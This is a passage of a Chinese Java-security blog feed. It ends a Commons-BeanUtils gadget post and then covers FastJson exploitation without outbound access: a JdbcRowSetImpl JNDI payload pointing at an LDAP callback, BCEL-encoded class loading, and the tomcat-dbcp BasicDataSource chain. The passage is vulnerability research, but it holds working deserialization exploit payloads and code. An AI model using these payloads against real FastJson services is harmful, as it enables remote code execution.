obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221513162.png" alt="在这里插入图片描述"></p><h2 id="省流"><a class="markdownIt-Anchor" href="#省流">#</a> 省流</h2><p>如果你了解 <code>TemplatesImpl</code>  和 <code>CC2</code>  的流程<br>前面的就都不用看了<br>只需要知道在 <code>TemplatesImpl</code>  中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; </span><br><span class="line">TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt;</span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt;</span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>最开始的方法 <code>getOutputProperties</code>  是以 <code>get</code>  开头，<br>而在 <code>JavaBean</code>  中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;catalina&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它包含一个私有属性 name，和读取和设置这个属性的两个方法，又称为 getter 和 setter。其中，getter<br> 的方法名以 get 开头即 <code>getter</code>  方法</p><p>commons-beanutils 中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任<br>意 JavaBean 的 getter 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Cat</span>(), <span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure><p>两者结合起来即将 <code>property</code>  的值为  <code>outputProperties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty( o1, outputProperties);</span><br></pre></td></tr></table></figure><p>就可以触发后面的任意代码了</p><p>写法没有什么奇特的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;apache-commons-beanutils&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#apache-commons-beanutils&quot;&gt;#&lt;/a&gt; Apache Commons Beanutils&lt;/h2&gt;
&lt;p&gt;Apach</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>FastJson不出网利用</title>
    <link href="https://ki10moc.github.io/2022/11/14/FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"/>
    <id>https://ki10moc.github.io/2022/11/14/FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/</id>
    <published>2022-11-13T17:28:36.000Z</published>
    <updated>2023-07-10T02:03:50.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="本文首发于奇安信攻防社区奇安信攻防社区-浅析fastjson不出网利用方式-butiannet"><a class="markdownIt-Anchor" href="#本文首发于奇安信攻防社区奇安信攻防社区-浅析fastjson不出网利用方式-butiannet">#</a> 本文首发于 [奇安信攻防社区](<a href="https://forum.butian.net/share/2040">奇安信攻防社区 - 浅析 FastJson 不出网利用方式 (butian.net)</a>)</h4><h2 id="0x01-jndi利用"><a class="markdownIt-Anchor" href="#0x01-jndi利用">#</a> 0x01 JNDI 利用</h2><p>JdbcRowSetImpl 中存在的 JNDI 注入</p><p><img src="https://img-blog.csdnimg.cn/93eaa2726d884ec6a5b8dfb72e59a49a.png" alt="在这里插入图片描述"></p><p>这里考虑 setAutoCommit</p><p><img src="https://img-blog.csdnimg.cn/4b9c50f76fe841879af122aaa18b491d.png" alt="在这里插入图片描述"></p><p>是个 set 方法</p><p>参数是布尔类型的</p><p><img src="https://img-blog.csdnimg.cn/331bf53417bb42e2a852350d9642db16.png" alt="在这里插入图片描述"></p><p>使用 Yakit 生成一个反连</p><p><img src="https://img-blog.csdnimg.cn/38b219d420654f538eb772a7cb5d9d9b.png" alt="在这里插入图片描述"></p><p>构造 EXP</p><p>首先类名是 <code>com.sun.rowset.JdbcRowSetImpl</code>  也就是 <code>@type</code>  的值</p><p>接着是 <code>.lookup</code>  的参数 <code>DataSourceName</code>  也就是 rmi 或 ldap 的地址</p><p>最后是 <code>AutoCommit</code>  布尔型的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonJdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/ZhALlpnN\&quot;,\&quot;AutoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/888b395807634ba88d2f329ff055a537.png" alt="在这里插入图片描述"></p><p>但是这种利用方式是需要出网的，并且有版本、依赖限制</p><p>下面来看一个可以本地利用的</p><h2 id="0x02-不出网利用"><a class="markdownIt-Anchor" href="#0x02-不出网利用">#</a> 0x02 不出网利用</h2><p>fastjson≤1.2.24</p><p>条件: <code>BasicDataSource</code>  只需要有 <code>dbcp</code>  或 <code>tomcat-dbcp</code>  的依赖即可，dbcp 即数据库连接池，在 java 中用于管理数据库连接，还是挺常见的。</p><p>在 <code>ClassLoader</code>  存在一处 <code>loadclass</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">       * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">          cl = deferTo.loadClass(class_name);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">          cl = Class.forName(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(resolve)</span><br><span class="line">        resolveClass(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>当类名是以 <code>$$BCEL$$</code>  开头，就会创建一个该类，并用 definclass 去调用</p><p>BCEL 提供两个类， <code>Repository</code>  和 <code>Utility</code></p><p><code>Repository</code>  用于将一个 <code>Java Class</code>  先转换成原生字节码，当然这里也可以直接使用 javac 命令来编译 java 文件生成字节码</p><p><code>Utility</code>  用于将原生的字节码转换成 BCEL 格式的字节码</p><p>其中 <code>createClass</code>  方法中</p><p><img src="https://img-blog.csdnimg.cn/2dbcf13ac47149a0ab2a58d224e30927.png" alt="在这里插入图片描述"></p><p>有一处解密，所以我们需要加密一下</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kilo、冰室/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/7</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 14:30</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(encode);</span><br><span class="line">        Class.forName(<span class="string">&quot;$$BCEL$$&quot;</span> + encode, <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">ClassLoader</span>());</span><br><span class="line">        <span class="comment">//        new ClassLoader().loadClass(&quot;$$BCEL$$&quot; + encode).newInstance();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-利用链"><a class="markdownIt-Anchor" href="#0x03-利用链">#</a> 0x03 利用链</h2><p>这次我们尝试以漏洞发现者的身份来看这条链子</p><p>首先是 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> ConnectionFactory <span class="title function_">createConnectionFactory</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// Load the JDBC driver class</span></span><br><span class="line">        <span class="type">Driver</span> <span class="variable">driverToUse</span> <span class="operator">=</span> <span class="built_in">this</span>.driver;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (driverToUse == <span class="literal">null</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; driverFromCCL = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (driverClassName != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (driverClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName, <span class="literal">true</span>, driverClassLoader);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> ClassNotFoundException cnfe) &#123;</span><br><span class="line">                        driverFromCCL = Thread.currentThread().getContextClassLoader().loadClass(driverClassName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception t) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Cannot load JDBC driver class &#x27;&quot;</span> + driverClassName + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">                    logWriter.println(message);</span><br><span class="line">                    t.printStackTrace(logWriter);</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(message, t);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (driverFromCCL == <span class="literal">null</span>) &#123;</span><br><span class="line">                    driverToUse = DriverManager.getDriver(url);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// Usage of DriverManager is not possible, as it does not</span></span><br><span class="line">                    <span class="comment">// respect the ContextClassLoader</span></span><br><span class="line">                    <span class="comment">// N.B. This cast may cause ClassCastException which is handled below</span></span><br><span class="line">                    driverToUse = (Driver) driverFromCCL.getConstructor().newInstance();</span><br><span class="line">                    <span class="keyword">if</span> (!driverToUse.acceptsURL(url)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;No suitable driver&quot;</span>, <span class="string">&quot;08001&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception t) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Cannot create JDBC driver of class &#x27;&quot;</span></span><br><span class="line">                        + (driverClassName != <span class="literal">null</span> ? driverClassName : <span class="string">&quot;&quot;</span>) + <span class="string">&quot;&#x27; for connect URL &#x27;&quot;</span> + url + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">                logWriter.println(message);</span><br><span class="line">                t.printStackTrace(logWriter);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(message, t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set up the driver connection factory we will use</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> userName;</span><br><span class="line">        <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">            connectionProperties.put(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log(<span class="string">&quot;DBCP DataSource configured without a &#x27;username&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">pwd</span> <span class="operator">=</span> password;</span><br><span class="line">        <span class="keyword">if</span> (pwd != <span class="literal">null</span>) &#123;</span><br><span class="line">            connectionProperties.put(<span class="string">&quot;password&quot;</span>, pwd);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log(<span class="string">&quot;DBCP DataSource configured without a &#x27;password&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ConnectionFactory</span> <span class="variable">driverConnectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DriverConnectionFactory</span>(driverToUse, url,</span><br><span class="line">                connectionProperties);</span><br><span class="line">        <span class="keyword">return</span> driverConnectionFactory;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们来看关键部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (driverClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName, <span class="literal">true</span>, driverClassLoader);</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure><p>若存在 <code>driverClassLoader</code>  则会对类进行初始化</p><p>这里的 <code>driverClassName</code>  和 <code>driverClassLoader</code>  都是可控的</p><p>这里就可以考虑将 <code>driverClassLoader</code>  的参数写为 <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p><p>接着</p><p>在 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createDataSource()</code>  中调用了 <code>createConnectionFactory()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> DataSource <span class="title function_">createDataSource</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (closed) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Data source is closed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Return the pool if we have already created it</span></span><br><span class="line">        <span class="comment">// This is double-checked locking. This is safe since dataSource is</span></span><br><span class="line">        <span class="comment">// volatile and the code is targeted at Java 5 onwards.</span></span><br><span class="line">        <span class="keyword">if</span> (dataSource != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> dataSource;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dataSource != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> dataSource;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            jmxRegister();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// create factory which returns raw physical connections</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">ConnectionFactory</span> <span class="variable">driverConnectionFactory</span> <span class="operator">=</span> createConnectionFactory();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Set up the poolable connection factory</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            PoolableConnectionFactory poolableConnectionFactory;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                poolableConnectionFactory = createPoolableConnectionFactory(driverConnectionFactory);</span><br><span class="line">                poolableConnectionFactory.setPoolStatements(poolPreparedStatements);</span><br><span class="line">                poolableConnectionFactory.setMaxOpenPreparedStatements(maxOpenPreparedStatements);</span><br><span class="line">                success = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> SQLException se) &#123;</span><br><span class="line">                <span class="keyword">throw</span> se;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> RuntimeException rte) &#123;</span><br><span class="line">                <span class="keyword">throw</span> rte;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Error creating connection factory&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (success) &#123;</span><br><span class="line">                <span class="comment">// create a pool for our connections</span></span><br><span class="line">                createConnectionPool(poolableConnectionFactory);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Create the pooling data source to manage connections</span></span><br><span class="line">            DataSource newDataSource;</span><br><span class="line">            success = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                newDataSource = createDataSourceInstance();</span><br><span class="line">                newDataSource.setLogWriter(logWriter);</span><br><span class="line">                success = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> SQLException se) &#123;</span><br><span class="line">                <span class="keyword">throw</span> se;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> RuntimeException rte) &#123;</span><br><span class="line">                <span class="keyword">throw</span> rte;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Error creating datasource&quot;</span>, ex);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">                    closeConnectionPool();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If initialSize &gt; 0, preload the pool</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; initialSize; i++) &#123;</span><br><span class="line">                    connectionPool.addObject();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception e) &#123;</span><br><span class="line">                closeConnectionPool();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Error preloading the connection pool&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If timeBetweenEvictionRunsMillis &gt; 0, start the pool&#x27;s evictor task</span></span><br><span class="line">            startPoolMaintenance();</span><br><span class="line"></span><br><span class="line">            dataSource = newDataSource;</span><br><span class="line">            <span class="keyword">return</span> dataSource;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里需要让</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dataSource != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> dataSource;</span><br><span class="line">        &#125;</span><br><span class="line">        <span 